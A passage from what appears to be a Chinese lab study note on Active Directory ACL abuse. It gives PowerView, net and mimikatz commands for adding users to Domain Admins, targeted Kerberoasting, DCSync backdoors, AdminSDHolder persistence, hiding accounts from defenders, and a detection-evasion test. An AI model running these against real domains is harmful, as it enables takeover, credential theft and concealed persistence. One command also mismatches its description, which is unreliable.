+<p>运行之后会弹出一个xxm权限的cmd窗口，即可使用xxm权限执行任意命令</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574352569785.png" alt="1574352569785"></p>
+<h3 id="GenericAll-on-Group"><a href="#GenericAll-on-Group" class="headerlink" title="GenericAll on Group"></a>GenericAll on Group</h3><p>环境和上文相同，并且已经删除了xxm账户中的ACE。GenericAll on Group说的是对一个组有GenericAll权限</p>
+<p>查看用户组domain admins</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetGroup &quot;domain admins&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574352888267.png" alt="1574352888267"></p>
+<p>此时zhangs和xxm均为域内普通权限用户，然后在域管理员组domain admins的DACL中加入zhangs的GenericAll权限</p>
+<p>命令行设置：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity zhangs -PrincipalIdentity xiaom -Rights ResetPassword -Verbose</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574433512298.png" alt="1574433512298"></p>
+<p>然后再win2012上使用命令查看domain admins的权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ObjectAcl -ResolveGUIDs| ? &#123;$_.objectdn -eq &quot;CN&#x3D;Domain Admins,CN&#x3D;Users,DC&#x3D;test,DC&#x3D;local&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在结果中有一条SID为zhangs的SID，权限为GenericAll</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574434341644.png" alt="1574434341644"></p>
+<p>然后尝试将xxm加入domain admins组：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; xxm &#x2F;add &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p>可以看到已经成功将xxm加入管理员组,然后再删除了，之后将DACL中的内容删除之后再尝试加入，发现已经被拒绝。</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574434513186.png" alt="1574434513186"></p>
+<p>在zhangs具有这个权限的时候使用PowerSploit能够达到相同的目的</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># with active directory module</span></span><br><span class="line"><span class="built_in">Add-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">"domain admins"</span> <span class="literal">-Members</span> xxm</span><br><span class="line"></span><br><span class="line"><span class="comment"># with Powersploit</span></span><br><span class="line"><span class="built_in">Add-NetGroupUser</span> <span class="literal">-UserName</span> xxm <span class="literal">-GroupName</span> <span class="string">"domain admins"</span> <span class="literal">-Domain</span> <span class="string">"test.local"</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="GenericAll-GenericWrite-Write-on-Computer"><a href="#GenericAll-GenericWrite-Write-on-Computer" class="headerlink" title="GenericAll/GenericWrite/Write on Computer"></a>GenericAll/GenericWrite/Write on Computer</h3><p>这个权限能够对Computer的属性进行改写，利用方式是结合Kerberos RDBC来进行攻击这个具有可写权限的计算机。比如此时对Win2012这台主机具有写权限，那么可以使用Powermad工具创建一个假的域内主机testrbcd，然后将Win2012主机的msDS-AllowedToActOnBehalfOfOtherIdentity字段设置为testrbcd$</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADComputer</span> win2012 <span class="literal">-PrincipalsAllowedToDelegateToAccount</span> testrbcd<span class="variable">$</span></span><br></pre></td></tr></table></figure>
+
+<p>然后使用Rubeus工具获取能够访问win2012特定SPN的票据。详情可见Kerberos委派之基于资源的约束委派文章。</p>
+<h3 id="WriteProperty-on-Group"><a href="#WriteProperty-on-Group" class="headerlink" title="WriteProperty on Group"></a>WriteProperty on Group</h3><p>WriteProperty on Group说的是对一个组具有WriteProperty权限的情况下，“写入全部属性”除了WriteProperty还包括了其他的权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, GenericRead, WriteDacl, WriteOwner</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574560097806.png" alt="1574560097806"></p>
+<p>在Domain Admins组的列表中添加写入全部属性，会生成一条新的ACE</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574560158595.png" alt="1574560158595"></p>
+<p>访问被标记为特殊，没有实际显示具体权限，测试添加此条ACE前后：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574560211929.png" alt="1574560211929"></p>
+<h3 id="Self-Self-Membership-on-Group"><a href="#Self-Self-Membership-on-Group" class="headerlink" title="Self (Self-Membership) on Group"></a>Self (Self-Membership) on Group</h3><p>这条权限指的是某个账户能够把自身添加到某个组的权限(需要在某个组的高级权限中添加ACE，也就是说针对的是组对象)</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574561144618.png" alt="1574561144618"></p>
+<p>添加完之后可以使用zhangs的权限将zhangs自身添加到Domain Admins组：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; zhangs &#x2F;add &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1574561300763.png" alt="1574561300763"></p>
+<h3 id="WriteProperty-Self-Membership"><a href="#WriteProperty-Self-Membership" class="headerlink" title="WriteProperty (Self-Membership)"></a>WriteProperty (Self-Membership)</h3><p>WriteProperty直译为写所有权。这个权限利用针对的对象为组对象，能够赋予账户对于某个组的可写权限，在Domain Admins组里设置zhangs账户的WriteProperty权限：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578298388827.png" alt="1578298388827"></p>
+<p>然后使用zhangs账户权限可以将xxm账户加入Domain Admins组：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; xxm &#x2F;add &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578298577041.png" alt="1578298577041"></p>
+<h3 id="Targeted-Kerberoasting"><a href="#Targeted-Kerberoasting" class="headerlink" title="Targeted Kerberoasting"></a>Targeted Kerberoasting</h3><p>Targeted Kerberoasting是说在具有对目标账户的写权限时，通过设置目标账户的servicePrincipalName值，进行Kerberoasting攻击的方法。注意，攻击条件是：对目标账户具有WriteDacl或WriteOwner权限。（这里XXM为被爆破的账户，zhangs为攻击者）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -Identity xxm -Properties samaccountname,servicePrincipalName</span><br><span class="line">Set-DomainObject -Identity xxm -SET @&#123;serviceprincipalname&#x3D;&#39;Exchange&#x2F;testwin7&#39;&#125;</span><br><span class="line">Get-DomainUser xxm | Get-DomainSPNTicket | fl</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578229602420.png" alt="1578229602420"></p>
+<p>获取的hash值就可以使用hashcat或者是john进行爆破。在获取hash值之后可以使用命令将servicePrincipalName值清空：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject -Identity xxm -Clear servicePrincipalName</span><br></pre></td></tr></table></figure>
+
+<h3 id="针对域对象的后门"><a href="#针对域对象的后门" class="headerlink" title="针对域对象的后门"></a>针对域对象的后门</h3><p>上面所说的后门都是针对User Objects或者Group Objects的，这里要说的是针对Domain Objects。通过在Domain对象的DACL中添加ACE能够赋予用户特定的权限。因为实现这个操作需要较高权限，所以可以使用，这里使用powerviewer.ps1的Add-DomainObjectAcl函数实现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;test,DC&#x3D;local&quot; -PrincipalIdentity zhangs -Rights DCSync</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578299563009.png" alt="1578299563009"></p>
+<p>然后使用zhangs进行DCSync，这里可以看到添加前后的变化：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;lsadump::dcsync &#x2F;user:test\krbtgt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578299641064.png" alt="1578299641064"></p>
+<h3 id="针对组策略对象的ACL"><a href="#针对组策略对象的ACL" class="headerlink" title="针对组策略对象的ACL"></a>针对组策略对象的ACL</h3><p>GPO中的ACL同样能够进行权限维持等操作，修改SYSVOL的属性，意味着受托人可以修改GPO的设置。</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578303730837.png" alt="1578303730837"></p>
+<p>以域控组的组策略为例，可以在组策略管理中的委派选项中进行设置：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578304668288.png" alt="1578304668288"></p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578304812261.png" alt="1578304812261"></p>
+<p>创建之后在对应的GPO文件夹下可以看到对应的权限：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578304920969.png" alt="1578304920969"></p>
+<h2 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h2><h3 id="Powerview"><a href="#Powerview" class="headerlink" title="Powerview"></a>Powerview</h3><p>Powerview在上文的利用中也说过，对各种权限的设置可使用的函数可对应为：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578305327522.png" alt="1578305327522"></p>
+<h3 id="Invoke-ACLPwn"><a href="#Invoke-ACLPwn" class="headerlink" title="Invoke-ACLPwn"></a>Invoke-ACLPwn</h3><p>运行时需要.NET 3.5环境，Windows Server 2012安装遇到报错，最后的解决方法(需要在网上下载SxS的安装包<a href="https://pan.baidu.com/share/init?surl=kDgdYerM0lVB32Q_IEqLUw提取码：gwzk)：" target="_blank" rel="noopener">https://pan.baidu.com/share/init?surl=kDgdYerM0lVB32Q_IEqLUw提取码：gwzk)：</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /<span class="built_in">enable-feature</span> /all /featurename:NetFX3 /Source:F:\Sources\SxS\</span><br></pre></td></tr></table></figure>
+
+<p>GitHub地址：<a href="https://github.com/fox-it/Invoke-ACLPwn" target="_blank" rel="noopener">https://github.com/fox-it/Invoke-ACLPwn</a></p>
+<p>背景信息在发布者博客上：<a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</a></p>
+<p>环境需要：</p>
+<p>​    .NET 3.5 + sharphound.exe + mimikatz.exe</p>
+<p>用法示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -NoDCSync</span><br><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe</span><br><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -userAccountToPwn &#39;Administrator&#39;</span><br><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -LogToFile</span><br><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -NoSecCleanup</span><br><span class="line">.\Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username &#39;testuser&#39; -Domain &#39;xenoflux.local&#39; -Password &#39;Welcome01!&#39;</span><br></pre></td></tr></table></figure>
+
+<p>使用第一条标识了-NoDCSync的命令：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1572402671046.png" alt="1572402671046"></p>
+<p>提示Got WriteDACL permissions.如果加上mimikatz.exe一起使用,可以看到直接获取了krbtgt的HASH值，也就是说已经可以直接生成黄金票据了：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1572430602702.png" alt="1572430602702"></p>
+<h3 id="NTLMRelay"><a href="#NTLMRelay" class="headerlink" title="NTLMRelay"></a>NTLMRelay</h3><p>比如此前的Exchange的SSRF漏洞+NTLMRelay攻击，实际上有两种攻击方式</p>
+<p>1、ACL Attack：修改了域对象上的ACL，并向受攻击者控制的用户授予Replication-Get-Changes-All权限。这个权限能够进行DCSync。</p>
+<p>2、Group Attack：这种攻击发生在无法修改域ACL的情况下，如果无法修改ACL，则需要考虑将访问权添加到域中的几个高特权组中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Enterprise Admins</span><br><span class="line">Domain Admins</span><br><span class="line">Backup Operators（可以备份域控制器上的关键文件）</span><br><span class="line">Account Operators（可以控制域中几乎所有的组）</span><br></pre></td></tr></table></figure>
+
+<h3 id="RACE"><a href="#RACE" class="headerlink" title="RACE"></a>RACE</h3><p><a href="https://github.com/samratashok/RACE" target="_blank" rel="noopener">https://github.com/samratashok/RACE</a></p>
+<p><a href="https://www.labofapenetrationtester.com/" target="_blank" rel="noopener">https://www.labofapenetrationtester.com/</a></p>
+<h2 id="针对DACL的隐身方式"><a href="#针对DACL的隐身方式" class="headerlink" title="针对DACL的隐身方式"></a>针对DACL的隐身方式</h2><h3 id="Hiding-the-Security-Descriptor隐藏安全描述符"><a href="#Hiding-the-Security-Descriptor隐藏安全描述符" class="headerlink" title="Hiding the Security Descriptor隐藏安全描述符"></a>Hiding the Security Descriptor隐藏安全描述符</h3><p>这种方式是在文章<a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf中看到的，其中介绍了隐藏安全描述符的方式：" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf中看到的，其中介绍了隐藏安全描述符的方式：</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、将对象的所有者更改为攻击者控制的主体</span><br><span class="line">2、向目标对象添加一个拒绝Everyone的显式ACE</span><br></pre></td></tr></table></figure>
+
+<p>但是在测试中实际上发现这种方式没有成功：</p>
+<p>首先在用户xxm的账户中加入一条主体（受托人）为zhangs的GenericAll权限：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578328137430.png" alt="1578328137430"></p>
+<p>此时zhangs账户能够修改xxm账户的密码：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578328237219.png" alt="1578328237219"></p>
+<p>随后在原有DACL的基础上添加一条拒绝读取的ACE，主体为Everyone，类型为拒绝：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578328397149.png" alt="1578328397149"></p>
+<p>此时发现即使是Test\Administrator账户也已经无法看到DACL列表：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578328479029.png" alt="1578328479029"></p>
+<p>但是再次使用命令进行修改密码时，发现被拒绝了，尽管此时xxm这个账户对象的所有者是zhangs账户。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user xxm admin123! &#x2F;domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578406554872.png" alt="1578406554872"></p>
+<p>也就是说添加了一条禁止读取的ACE，同时添加了一条允许完全控制权限的ACE，此时这条允许完全控制的ACE是不起作用的。所以这种方式我是实验失败了。</p>
+<h3 id="Hiding-the-Principal-隐藏主要的对象"><a href="#Hiding-the-Principal-隐藏主要的对象" class="headerlink" title="Hiding the Principal-隐藏主要的对象"></a>Hiding the Principal-隐藏主要的对象</h3><p>通过隐藏账户可以掩盖主体本身，阻止防御者轻易的发现谁实际上拥有ACE中指定的权限。</p>
+<h4 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、将要隐藏的用户所有者改为攻击者或者攻击者控制的账户</span><br><span class="line">2、设置一条拒绝完全控制的ACE</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578494104661.png" alt="1578494104661"></p>
+<p>点击应用之后所有用户都无法在外部访问查看此账户的ACL，包括administrator：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainObjectAcl -Identity hideuser -domain test.local -Resolve</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578494053578.png" alt="1578494053578"></p>
+<p>但是如上图所示，在ADSI编辑器中还是可以看到的，如果想要在ADSI编辑器中也看不到，那么就要将主体设置为用户本身，或者其他攻击者控制的账户：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578494231804.png" alt="1578494231804"></p>
+<p>点击应用可以看到，即使在ADSI编辑器中也无法查询到：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578494294845.png" alt="1578494294845"></p>
+<p>同时在AD用户和计算机中用户类型会变为未知：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578494407808.png" alt="1578494407808"></p>
+<h4 id="隐藏OU中所有的子对象"><a href="#隐藏OU中所有的子对象" class="headerlink" title="隐藏OU中所有的子对象"></a>隐藏OU中所有的子对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接添加一条拒绝Everyone的列出内容权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578494954759.png" alt="1578494954759"></p>
+<p>然后再查看这个OU的时候会发现所有的用户都不显示。</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578494996863.png" alt="1578494996863"></p>
+<p>同样，通过powerviewer也无法查看ACL：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578495045913.png" alt="1578495045913"></p>
+<h2 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h2><h3 id="DCSync后门"><a href="#DCSync后门" class="headerlink" title="DCSync后门"></a>DCSync后门</h3><p>通商贸说的针对域对象的后门一样：</p>
+<p>使用powerviewer.ps1的Add-DomainObjectAcl函数实现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;test,DC&#x3D;local&quot; -PrincipalIdentity zhangs -Rights DCSync</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578299563009.png" alt="1578299563009"></p>
+<p>实际上执行之后会在域对象的DACL中添加一条对攻击者控制的账户的复制目录更改的ACE：</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578499853347.png" alt="1578499853347"></p>
+<p>然后使用zhangs进行DCSync，这里可以看到添加前后的变化：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &quot;lsadump::dcsync &#x2F;user:test\krbtgt&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578299641064.png" alt="1578299641064"></p>
+<p>注意，这里复制目录更改权限必须在域对象上添加，其他域内对象的权限列表中并没有这个权限。</p>
+<h3 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a>AdminSDHolder</h3><p>AdminSDHolder会将自身的ACL列表每隔一个小时向受保护的组中同步，所以如果在AdminSDHolder中添加一个ACE作为后门，则受保护的组中将会一直被同步策略。受保护的组有<a href="https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)?redirectedfrom=MSDN：" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)?redirectedfrom=MSDN：</a></p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578580704942.png" alt="1578580704942"></p>
+<p>在AdminSDHolder的DACL中设置一条受托人为zhangs，权限为完全控制的的ACE</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$UserSid &#x3D; Convert-NameToSid zhangs</span><br><span class="line">Get-DomainObjectAcl xxm -ResolveGUIDs | ?&#123;$_.SecurityIdentifier -eq $Userid&#125;</span><br><span class="line">Get-DomainUser xxm -Properties objectsid,samaccountname,memberof | fl</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;CN&#x3D;AdminSDHolder,CN&#x3D;System,DC&#x3D;test,DC&#x3D;local&quot; -PrincipalIdentity zhangs -Rights All</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578572708953.png" alt="1578572708953"></p>
+<p>将zhangs这个用户对象的主体设置为其自身：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser zhangs -Properties distinguishedname,memberof</span><br><span class="line">Set-DomainObjectOwner -Identity zhangs -OwnerIdentity zhangs</span><br><span class="line">Get-DomainUser -Identity zhangs -SecurityMasks owner</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578572894639.png" alt="1578572894639"></p>
+<p>将对象从其所在的OU列表中隐藏，并为对象添加一条受托人为“Everyone”、权限为拒绝的ACE（这里就是上文提到的list_context权限）：</p>
+<p>此时无法看到zhangs账户，但是仍然能够查询到xxm账号中受托人为zhangs的ACE：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$UserSid &#x3D; Convert-NameToSid zhangs</span><br><span class="line">Get-DomainObjectAcl xxm -ResolveGUIDs| ?&#123;$_.SecurityIdentifier -eq $UserSid&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578574578649.png" alt="1578574578649"></p>
+<p>然后此时再zhangs用户权限下重置xxm账户密码创建一个xxm账户权限的cmd.exe</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$SecPass &#x3D; ConvertTo-SecureString &#39;pass123!&#39; -AsPlainText -Force</span><br><span class="line">Set-DomainUserPassword -Identity xxm -AccountPassword $SecPass -Verbose</span><br><span class="line">runas &#x2F;user:test\xxm cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578575547879.png" alt="1578575547879"></p>
+<p>实际上直接用net user也是可以的，因为此时zhangs有xxm的完全控制权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user xxm admin123! &#x2F;domain</span><br><span class="line">runas &#x2F;user:test\xxm cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/1578575659800.png" alt="1578575659800"></p>
+<p>不过这样也有一个坏处就是所有的受保护组的ACL中都会被添加上这一条作为后门的ACE，隐藏其中一个账户并不能起到作用，所以感觉还是比较容易被发现的。</p>
+<p>在测试WatchAD的时候发现向System对象(AdminSDHolder的父对象)写入应用于所有后代的完全控制权限可以绕过WatchAD的限制。</p>
+<p>直接在域控上ADSI修改产生告警，使用powerview对AdminSDHolder进行添加ACL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\pv.ps1</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;CN&#x3D;AdminSDHolder,CN&#x3D;System,DC&#x3D;test,DC&#x3D;local&quot; -PrincipalIdentity xiaom -Rights All</span><br></pre></td></tr></table></figure>
+
+<p>测试结果发现特征被命中</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/image-20200424102901487.png" alt="image-20200424102901487"></p>
+<p>但是如果直接修改System不会命中，也不会触发5136事件。</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/image-20200424111802703.png" alt="image-20200424111802703"></p>
+<p>设置应用于这个对象及所有后代，修改时间为60s：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters &#x2F;v AdminSDProtectFrequency &#x2F;t REG_DWORD &#x2F;d 60</span><br></pre></td></tr></table></figure>
+
+<p>60秒之后就可以使用xiaom权限添加任意文件到domain admins组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\pv.ps1</span><br><span class="line">Add-ADGroupMember -Identity &quot;domain admins&quot; -Members xiaom</span><br></pre></td></tr></table></figure>
+
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/image-20200424112549123.png" alt="image-20200424112549123"></p>
+<p><a href="http://www.selfadsi.org/extended-ad/ad-permissions-adminsdholder.htm" target="_blank" rel="noopener">http://www.selfadsi.org/extended-ad/ad-permissions-adminsdholder.htm</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AdminSDHolder/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AdminSDHolder/</a></p>
+<p>本来以为是实验成功了，结果是因为AdminSDHoleder的ACL中的Everyone有个写入权限，导致了可以随意添加，乌龙。并且默认情况下AdminSDHoleder组是禁用继承的，要点击启用继承才行。</p>
+<p><img src="ACL%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95.assets/image-20200424143647930.png" alt="image-20200424143647930"></p>
+<p>点击之后父对象的ACE会同步到此对象，但是这样的话就会触发告警，直接修改Everyone的写权限依然会触发。</p>
